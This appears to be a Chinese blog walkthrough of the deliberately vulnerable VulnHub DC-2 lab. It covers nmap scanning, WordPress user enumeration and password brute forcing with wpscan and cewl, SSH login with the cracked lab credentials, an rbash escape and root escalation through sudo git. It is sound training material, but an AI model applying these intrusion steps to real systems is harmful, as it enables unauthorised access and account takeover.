
--- 
title:  [ vulnhub靶机通关篇 ] 渗透测试综合靶场 DC-2 通关详解 (附靶机搭建教程) 
tags: []
categories: [] 

---
>  
 <h2>🍬 博主介绍</h2> 
 👨‍🎓 博主介绍：大家好，我是  ，很高兴认识大家~ ✨主攻领域：【渗透领域】【数据通信】 【通讯安全】 【web安全】【面试分析】 🎉点赞➕评论➕收藏 == 养成习惯（一键三连）😋 🎉欢迎关注💗一起学习👍一起讨论⭐️一起进步📝文末有彩蛋 🙏作者水平有限，欢迎各位大佬指点，相互学习进步！ 




#### 文章目录
- - - <ul><li>- - - - - - - - - - - - - - - 


## 一、环境搭建：

### 1、靶场描述

```
Much like DC-1, DC-2 is another purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.
As with the original DC-1, it's designed with beginners in mind.
Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.
Just like with DC-1, there are five flags including the final flag.
And again, just like with DC-1, the flags are important for beginners, but not so important for those who have experience.
In short, the only flag that really counts, is the final flag.
For beginners, Google is your friend. Well, apart from all the privacy concerns etc etc.
I haven't explored all the ways to achieve root, as I scrapped the previous version I had been working on, and started completely fresh apart from the base OS install.
和DC-1一样，有五个flag

```

### 2、下载靶场环境

>  
 靶场下载地址： 


```
https://www.vulnhub.com/entry/dc-2,311/

```

>  
 下载下来的文件如下 


<img src="https://img-blog.csdnimg.cn/4f7ed96b0b854391b98542f40c0c8308.png" alt="在这里插入图片描述">

### 3、启动靶场环境

>  
 下载下来是虚拟机压缩文件，直接用Vmvare导入就行。 


<img src="https://img-blog.csdnimg.cn/c81b4028d6a34ee1992f0ffdf0a9e9de.png" alt="在这里插入图片描述">

>  
 设置虚拟机名称 


<img src="https://img-blog.csdnimg.cn/b14d5e61747943a3bf8f84d5cafdac5b.png" alt="在这里插入图片描述">

>  
 导入中 


<img src="https://img-blog.csdnimg.cn/5c1f7ffb548d4c2eab01715395bdb24c.png" alt="在这里插入图片描述">

>  
 导入完成之后打开后把网络模式设置为NAT模式。 


<img src="https://img-blog.csdnimg.cn/6b026b63877f45858cec00c59f96f689.png" alt="在这里插入图片描述">

>  
 虚拟机开启之后界面如下，我们不知道ip，需要自己探活，网段知道：192.168.233.0/24 


<img src="https://img-blog.csdnimg.cn/f77ad4b9505649d68d83c5d55b610d8b.png" alt="在这里插入图片描述">

## 二、渗透靶场

### 1、目标：

>  
 目标就是我们搭建的靶场，靶场IP为：192.168.233.0/24 


<img src="https://img-blog.csdnimg.cn/8bf4e1c2eafa460388a48dc3f4d42680.png" alt="在这里插入图片描述">

### 2、信息收集：寻找靶机真实IP

```
nmap -sP 192.168.233.0/24

```

<img src="https://img-blog.csdnimg.cn/2a7b84fc912949f7942a557c1074ee40.png" alt="在这里插入图片描述">

>  
 本机ip为192.168.233.130 所以分析可得靶机ip为192.168.233.178 <img src="https://img-blog.csdnimg.cn/c0f3475bcc994f6a8755485c5d05c034.png" alt="在这里插入图片描述"> 


### 3、信息收集：探端口及服务

```
nmap -A -p- -v 192.168.233.178

```

<img src="https://img-blog.csdnimg.cn/6ce05ab4e1fc4f3cb012ff85efb362de.png" alt="在这里插入图片描述">

>  
 发现开放了80端口，存在web服务，Apache/2.4.10， 发现开放了7744端口，开放了ssh服务，OpenSSH 6.7p1 


### 4、访问web站点

```
http://192.168.233.178/

```

>  
 发现访问不了，且发现我们输入的ip地址自动转化为了域名，我们想到dc-2这个域名解析失败，我们需要更改hosts文件，添加一个ip域名指向。 


>  
 修改hosts文件，添加靶机IP到域名dc-2的指向 


```
192.168.233.178 dc-2

```

<img src="https://img-blog.csdnimg.cn/a315a3f58d9b4e27a13e397dd61247ec.png" alt="在这里插入图片描述">

>  
 添加完成之后，再次访问，访问成功 


<img src="https://img-blog.csdnimg.cn/e523331edf674ac5bb76c410b6f88590.png" alt="在这里插入图片描述">

>  
 可以很明显的发现这是一个wordpress的站点 


### 5、发现flag1

>  
 在网页下面我们flag 


<img src="https://img-blog.csdnimg.cn/ff6c6e2e8eee4520951db690fb2f0efc.png" alt="在这里插入图片描述">

>  
 点进入发现是flag1 大致意思如下： 你通常的单词列表可能不起作用，所以，也许你只是得小心点。 更多的密码总是更好，但有时你就是赢不了他们都是。 以一个身份登录，以查看下一个标志。 如果你找不到它，就以另一种身份登录。 


<img src="https://img-blog.csdnimg.cn/e83c0b288347452d87263b1d5ee1e5da.png" alt="在这里插入图片描述">

>  
 大致意思就是暴力破解，账号密码 


### 6、做一个目录扫描

```
dirb http://dc-2/ 

```

<img src="https://img-blog.csdnimg.cn/95e106aab03b40eaabaa9543e71a7045.png" alt="在这里插入图片描述">

>  
 发现后台地址 


```
http://dc-2/wp-login.php?redirect_to=http%3A%2F%2Fdc-2%2Fwp-admin%2F&amp;reauth=1

```

<img src="https://img-blog.csdnimg.cn/7623a169d2b14ce2b2578a63d4bfa549.png" alt="在这里插入图片描述">

>  
 发现多个遍历，但似乎没什么有用的东西 <img src="https://img-blog.csdnimg.cn/32d1711e3dc54619b448054bc0480b68.png" alt="在这里插入图片描述"> 


### 7、用户名枚举

>  
 前面我们提到这是一个wordpress的站，我们采用专门针对wordpress的工具wpscan来进行扫描 Wpscan一些常用语句： 


```
wpscan --url http://dc-2
wpscan --url http://dc-2 --enumerate t 扫描主题
wpscan --url http://dc-2 --enumerate p 扫描插件
wpscan --url http://dc-2 --enumerate u 枚举用户

```

>  
 扫描wordpress版本 


```
wpscan --url http://dc-2 

```

<img src="https://img-blog.csdnimg.cn/ba7381dbced64b15959335bd2987c499.png" alt="在这里插入图片描述">

>  
 发现wordpress的版本4.7.10 


<img src="https://img-blog.csdnimg.cn/18e0840c045a4c40860a56a22c381a86.png" alt="在这里插入图片描述">

>  
 登录页面尝试登录 随即输入用户名密码，提示用户名不存在，似乎可以进行用户名枚举 


<img src="https://img-blog.csdnimg.cn/d0acfdbcce73464390d9ea58ec94c8de.png" alt="在这里插入图片描述">

>  
 首先来个用户枚举，再尝试利用枚举到的用户爆破密码 


```
wpscan --url http://dc-2 --enumerate u

```

<img src="https://img-blog.csdnimg.cn/31acd03ccda64055975f4b790453746d.png" alt="在这里插入图片描述">

>  
 枚举出三个用户名 


```
admin jerry tom

```

<img src="https://img-blog.csdnimg.cn/7d3670affef543268a28783b2da0cc0c.png" alt="在这里插入图片描述">

### 8、暴力破解出账号密码

>  
 根据flag1可以用暴力破解，我们使用cewl生成字典，使用wpscan进行暴力破解 


```
cewl http://dc-2/ &gt; 1.txt

```

<img src="https://img-blog.csdnimg.cn/ec42df1c07314a8da67091116265e647.png" alt="在这里插入图片描述">

```
wpscan --url http://dc-2 --passwords 1.txt

```

<img src="https://img-blog.csdnimg.cn/4e31aa71ca0d42189b9342abc678b83b.png" alt="在这里插入图片描述">

>  
 爆破出来两个账号 


```
jerry/adipiscing
tom/parturient

```

<img src="https://img-blog.csdnimg.cn/8c72c2e0075942bcba76b682117dbec1.png" alt="在这里插入图片描述">

>  
 jerry/adipiscing登录此站点 


<img src="https://img-blog.csdnimg.cn/7e2cb0b4660c480388e7dedaa73bf3a2.png" alt="在这里插入图片描述">

>  
 tom/parturient登陆此站点 


<img src="https://img-blog.csdnimg.cn/6c8934fec16e4d2ab1756874721da646.png" alt="在这里插入图片描述">

### 9、发现flag2

>  
 登录后台之后，我们看到flag2，我用的是jerry的账号 


<img src="https://img-blog.csdnimg.cn/43bd44dc94f646d8af302d506dd06b6e.png" alt="在这里插入图片描述">

>  
 点进去之后看到flag2提示信息，简单说就是如果wordpress行不通的话就会一个点，我们之前发现有ssh，我们看看ssh 


```
If you can't exploit WordPress and take a shortcut, there is another way.
如果你不能利用WordPress并采取一条捷径，还有另外一种方法。
Hope you found another entry point.
希望你找到了另一个入口。

```

<img src="https://img-blog.csdnimg.cn/5cd79c808bdc4a5bad1ebb8175b62891.png" alt="在这里插入图片描述">

### 10、在tom的家目录发现flag3

```
jerry/adipiscing
tom/parturient

```

>  
 登录ssh 


```
ssh tom@192.168.37.130 -p 7744

```

<img src="https://img-blog.csdnimg.cn/816c0276662f4d52a2c94a32bba85e78.png" alt="在这里插入图片描述">

>  
 在tom账号的家目录 发现flag3 cat用不了，我这里采用了vi来查看，当前=也可以反弹一个shell到kali 


<img src="https://img-blog.csdnimg.cn/2019c1466ae8462fa662600539adf75e.png" alt="在这里插入图片描述">

>  
 提示内容如下 


<img src="https://img-blog.csdnimg.cn/d3bed084643641a88635838d610fca25.png" alt="在这里插入图片描述">

>  
 接下来，尝试rbash绕过 查看可以使用的命令 


```
echo $PATH

```

<img src="https://img-blog.csdnimg.cn/7f49e071cd9b410bb857be2bbecb3fb6.png" alt="在这里插入图片描述">

>  
 cd进不去目录 使用ls直接查看目录信息 


<img src="https://img-blog.csdnimg.cn/a6f0f6a86f08409aa5eb6e8f4638efe6.png" alt="在这里插入图片描述">

>  
 使用echo来绕过rbash 


```
BASH_CMDS[a]=/bin/sh;a
export PATH=$PATH:/bin/
export PATH=$PATH:/usr/bin
echo /*

```

<img src="https://img-blog.csdnimg.cn/825c27e4109e42beb87b039ab01b4b00.png" alt="在这里插入图片描述">

### 11、在jerry的家目录发现flag4

```
cd jerry
ls
cat flag4.txt

```

>  
 看到提示信息如下： 


```
Good to see that you've made it this far - but you " re not home yet .
很高兴看到你走了这么远，但你还没回家。
You still need to get the final flag (the only flag that really counts!!! ).
您仍然需要获得最后的标志(唯一真正重要的标志！)
No hints here 一you're on your own now. :- )
这里没有暗示，一，你现在只能靠自己了。*-)
Go on
继续
git outta here!!!!

```

>  
 大致意思就是还没有结束。猜想需要提权才能获取到最终的flag，并且flag4 提示我们可以使用git，我们可以通过git来提权 


<img src="https://img-blog.csdnimg.cn/338bbd8ce5384da49b3fca9281e5a960.png" alt="在这里插入图片描述">

>  
 我们可以看到无需root权限，jerry 可以使用 git 


```
sudo -l  

```

<img src="https://img-blog.csdnimg.cn/78987751f6f3449b906ec0c4895a05fe.png" alt="在这里插入图片描述">

### 12、提权

>  
 查看一下可以使用的root权限命令 


```
find / -user root -perm -4000 -print 2&gt;/dev/null

```

<img src="https://img-blog.csdnimg.cn/968796f2ede341ebbcb20dffb5f2a5b9.png" alt="在这里插入图片描述">

>  
 sudo可以使用，但是不能到root权限(可以尝试jerry的用户) 在使用su jerry (密码：adipiscing) 


<img src="https://img-blog.csdnimg.cn/8cc01f7f3f904cdb95ba61516629da76.png" alt="在这里插入图片描述">

>  
 jerry用户也不可以直接sudo su 


<img src="https://img-blog.csdnimg.cn/3f98813c88754af2817937096a62cad6.png" alt="在这里插入图片描述">

>  
 发现可以使用git命令 (root权限) 


<img src="https://img-blog.csdnimg.cn/4a6da5dec10b4d60a6dc42566c023147.png" alt="在这里插入图片描述">

>  
 使用git命令进行提取 


<img src="https://img-blog.csdnimg.cn/ba43fdf32b9e43e69a3cd3047e9173e4.png" alt="在这里插入图片描述">

>  
 输入!/bin/sh，直接输入就行 


<img src="https://img-blog.csdnimg.cn/0d8aede5b4e141ec8bcb358801db19a7.png" alt="在这里插入图片描述">

>  
 提权成功 


<img src="https://img-blog.csdnimg.cn/b85acd7c4449477dbd7ef2715cbcf1ed.png" alt="在这里插入图片描述">

### 13.发现final-flag.txt

```
cd /root
cat final-flag.txt

```

<img src="https://img-blog.csdnimg.cn/54331ee5bb1347079f784c9e3c2098c9.png" alt="在这里插入图片描述">

## # 三、相关资源

    
